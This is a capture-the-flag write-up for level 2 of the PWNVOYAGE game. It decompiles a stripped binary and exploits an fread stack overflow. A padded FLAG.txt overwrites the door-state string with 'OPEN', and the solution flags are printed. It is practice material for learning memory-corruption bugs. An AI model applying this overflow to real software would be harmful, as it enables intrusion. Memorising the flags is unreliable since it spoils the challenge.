# PWNVOYAGE / GAME / PWN-VOYAGE_L2

Finally, things get more interesting. With the `file` command, we can observe that the binary is stripped. Additionally, we are prompted for a file named **FLAG.txt** containing the flags from the previous level.

```

caigoshinobi@freyja:~$ file ./PWN-VOYAGE_L2
./PWN-VOYAGE_L2: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cb162e623a468bace4baa7d427caa120424f421b, for GNU/Linux 3.2.0, stripped

caigoshinobi@freyja:~$ ./PWN-VOYAGE_L2

============================================================

 ██▓    ▓█████ ██▒   █▓▓█████  ██▓           ██▓ ██▓
▓██▒    ▓█   ▀▓██░   █▒▓█   ▀ ▓██▒          ▓██▒▓██▒
▒██░    ▒███   ▓██  █▒░▒███   ▒██░          ▒██▒▒██▒
▒██░    ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██░          ░██░░██░
░██████▒░▒████▒  ▒▀█░  ░▒████▒░██████▒      ░██░░██░
░ ▒░▓  ░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒░▓  ░      ░▓  ░▓
░ ░ ▒  ░ ░ ░  ░  ░ ░░   ░ ░  ░░ ░ ▒  ░       ▒ ░ ▒ ░
  ░ ░      ░       ░░     ░     ░ ░          ▒ ░ ▒ ░
====░==░===░==░=====░=====░==░====░==░=======░===░==========
                    ░
You mercilessly annihilate a pair of bloodthirsty undead,
their pitiable forms disintegrating in the face of your
power. However, as you reach the very threshold of the Vault,
a discouraging sight awaits you: The Vault's door is veiled
in an enigmatic magical aura, a barrier challenging anyone
to enter... yet you charge ahead with all your might.

============================================================


------------------------------------------------------
| *FLAG.txt REQUIRED*                                |
|                                                    |
| Create the FLAG.txt file and insert the flags of   |
| the previous levels, one per line.                 |
------------------------------------------------------

```

After creating the required file, we discover that Knight is attempting to break through the Vault door, which is flagged as **CLOSED**.

```

-$> Access Granted. Now let's pwn this f*cking door

-$> You give an almighty shove. The door is now CLOSED

-$> You are hurled backward by a spell from the ancient gates, compelled
    to retreat a few paces. The curses of defense begin to graze your armor,
    slowly dissolving the metal. Yet, the voice of your conscience continues
    to echo just one thing: Keep pushing.

```

We move on to the binary with dogbolt.org and try to make sense of it.

```

__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[304]; // [rsp+10h] [rbp-2D0h] BYREF
  char ptr[265]; // [rsp+140h] [rbp-1A0h] BYREF
  char haystack[135]; // [rsp+249h] [rbp-97h] BYREF
  FILE *v7; // [rsp+2D0h] [rbp-10h]
  FILE *stream; // [rsp+2D8h] [rbp-8h]

  sub_164E();
  strcpy(haystack, "CLOSED");
  stream = fopen("FLAG.txt", "r");
  if ( stream )
  {
    fread(ptr, 1uLL, 0x12CuLL, stream);
    fclose(stream);
    ptr[33] = 0;
    if ( (unsigned int)sub_151D(ptr) )
    {
      printf("-$> You give an almighty shove. The door is now %s\n", haystack);
      if ( strstr(haystack, "OPEN") )
      {
        v7 = fopen("FLAG.txt", "r");
        if ( v7 )
        {
          fread(v4, 1uLL, 0x12CuLL, v7);
          fclose(v7);
          sub_13EA(v4);
          return 0LL;
        }
        else
        {
          sub_14D8();
          return 1LL;
        }
      }
      else
      {
        puts(
          "\n"
          "-$> You are hurled backward by a spell from the ancient gates, compelled    \n"
          "    to retreat a few paces. The curses of defense begin to graze your armor,\n"
          "    slowly dissolving the metal. Yet, the voice of your conscience continues\n"
          "    to echo just one thing: Keep pushing.\n");
        return 1LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  else
  {
    sub_14D8();
    return 1LL;
  }
}

```

Some now we know that:

- The `haystack` variable is declared and initialized with the value **CLOSED**. This variable represents the state of the Vault door.

- The program attempts to open the file named **FLAG.txt** in read mode using `fopen`. If successful, it reads the content of the file into the `ptr` array with `fread`, limited to 300 bytes. Then, it closes the file.

- If the `haystack` contains **OPEN** it proceeds to open the **FLAG.txt** file again, reads its content into the `v4` array, closes the file, and calls the `sub_13EA(v4)` function.

- The `sub_13EA` function takes a hexadecimal string and processes it to obtain the flag. 


We can also note a possible vulnerability in this code, primarily due to the use of `fread`. The reason is that `fread` reads data from the file without checking the size of the data compared to the size of the destination buffer, which can lead to a stack overflow if the read data exceeds the buffer's size.


If indeed we insert some A's inside FLAG.txt:

```

-$> Access Granted. Now let's pwn this f*cking door

-$> You give an almighty shove. The door is now AAAAAA


-$> You are hurled backward by a spell from the ancient gates, compelled
    to retreat a few paces. The curses of defense begin to graze your armor,
    slowly dissolving the metal. Yet, the voice of your conscience continues
    to echo just one thing: Keep pushing.

caigoshinobi@freyja:~$ cat FLAG.txt
NTRLGC{TH1SH1LLSM3LLSL1K3V1CT0RY}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

```

It works! So it's possible to insert the string **OPEN** inside the `haystack` variable:

```

caigoshinobi@freyja:~$ cat FLAG.txt
NTRLGC{TH1SH1LLSM3LLSL1K3V1CT0RY}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOPEN

caigoshinobi@freyja:~$ ./PWN-VOYAGE_L2

============================================================

 ██▓    ▓█████ ██▒   █▓▓█████  ██▓           ██▓ ██▓
▓██▒    ▓█   ▀▓██░   █▒▓█   ▀ ▓██▒          ▓██▒▓██▒
▒██░    ▒███   ▓██  █▒░▒███   ▒██░          ▒██▒▒██▒
▒██░    ▒▓█  ▄  ▒██ █░░▒▓█  ▄ ▒██░          ░██░░██░
░██████▒░▒████▒  ▒▀█░  ░▒████▒░██████▒      ░██░░██░
░ ▒░▓  ░░░ ▒░ ░  ░ ▐░  ░░ ▒░ ░░ ▒░▓  ░      ░▓  ░▓
░ ░ ▒  ░ ░ ░  ░  ░ ░░   ░ ░  ░░ ░ ▒  ░       ▒ ░ ▒ ░
  ░ ░      ░       ░░     ░     ░ ░          ▒ ░ ▒ ░
====░==░===░==░=====░=====░==░====░==░=======░===░==========
                    ░
You mercilessly annihilate a pair of bloodthirsty undead,
their pitiable forms disintegrating in the face of your
power. However, as you reach the very threshold of the Vault,
a discouraging sight awaits you: The Vault's door is veiled
in an enigmatic magical aura, a barrier challenging anyone
to enter... yet you charge ahead with all your might.

============================================================

-$> Access Granted. Now let's pwn this f*cking door

-$> You give an almighty shove. The door is now OPEN

-$> Flag: NTRLGC{H3LL0B1TCH3S!}

```